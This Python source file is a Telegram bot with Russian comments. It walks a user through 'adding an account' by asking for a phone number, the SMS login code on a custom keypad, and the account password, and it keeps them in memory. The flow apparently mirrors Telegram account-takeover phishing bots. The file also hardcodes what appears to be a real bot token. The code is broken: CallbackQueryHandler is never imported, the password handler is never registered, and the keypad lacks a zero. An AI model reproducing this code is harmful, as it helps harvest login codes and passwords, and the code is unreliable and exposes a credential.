import logging
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackContext

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Словарь для хранения состояний пользователей
user_states = {}

# Стартовое сообщение
async def start(update: Update, context: CallbackContext):
    reply_keyboard = [['Добавить аккаунт', '😊']]
    markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text(
        "Привет! Выберите действие:",
        reply_markup=markup
    )

# Функция добавления аккаунта
async def add_account(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    user_states[user_id] = {'state': 'enter_phone'}  # Устанавливаем состояние пользователя
    await update.message.reply_text("Введите номер телефона:")

# Обработчик для ввода номера телефона
async def handle_message(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id in user_states and user_states[user_id]['state'] == 'enter_phone':
        # Сохраняем номер телефона
        user_states[user_id]['phone'] = update.message.text
        user_states[user_id]['state'] = 'enter_code'  # Переход к следующему шагу (ввод кода)

        # Отправляем клавиатуру 3x3 для ввода кода
        buttons = [
            [InlineKeyboardButton('1', callback_data='1'), InlineKeyboardButton('2', callback_data='2'), InlineKeyboardButton('3', callback_data='3')],
            [InlineKeyboardButton('4', callback_data='4'), InlineKeyboardButton('5', callback_data='5'), InlineKeyboardButton('6', callback_data='6')],
            [InlineKeyboardButton('7', callback_data='7'), InlineKeyboardButton('8', callback_data='8'), InlineKeyboardButton('9', callback_data='9')]
        ]
        reply_markup = InlineKeyboardMarkup(buttons)
        await update.message.reply_text('Введите код из SMS:', reply_markup=reply_markup)

# Обработчик нажатия на кнопки клавиатуры для ввода кода
async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    code = query.data  # Получаем цифру, которую ввел пользователь

    # Если пользователь в состоянии ввода кода
    if user_id in user_states and user_states[user_id]['state'] == 'enter_code':
        if 'code' not in user_states[user_id]:
            user_states[user_id]['code'] = code
        else:
            user_states[user_id]['code'] += code

        # Если код введен полностью (предположим, что код состоит из 6 цифр)
        if len(user_states[user_id]['code']) == 6:
            await query.edit_message_text(text=f"Код подтверждения введен: {user_states[user_id]['code']}")
            user_states[user_id]['state'] = 'check_password'
            await context.bot.send_message(chat_id=user_id, text="Введите пароль, если требуется (если пароля нет — просто пропустите):")

# Обработчик для пароля
async def handle_password(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id in user_states and user_states[user_id]['state'] == 'check_password':
        password = update.message.text
        if password:
            await update.message.reply_text(f"Пароль принят.")
        else:
            await update.message.reply_text("Авторизация завершена без пароля.")

        # Добавляем аккаунт
        user_states[user_id]['state'] = 'account_added'
        await update.message.reply_text(f"Аккаунт с номером {user_states[user_id]['phone']} добавлен.")

        # Появляется кнопка управления аккаунтами
        reply_keyboard = [['Управление аккаунтами']]
        markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
        await update.message.reply_text("Вы можете управлять своими аккаунтами:", reply_markup=markup)

# Основная функция запуска бота
def main():
    # Токен бота
    TOKEN = "6760012279:AAGfY1w2LR7TuY1r_mbMXIyLlscrai2oT28"

    # Создание приложения
    application = ApplicationBuilder().token(TOKEN).build()

    # Добавление обработчиков команд и сообщений
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Text("Добавить аккаунт"), add_account))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_handler))

    # Запуск бота
    application.run_polling()

if __name__ == '__main__':
    main()
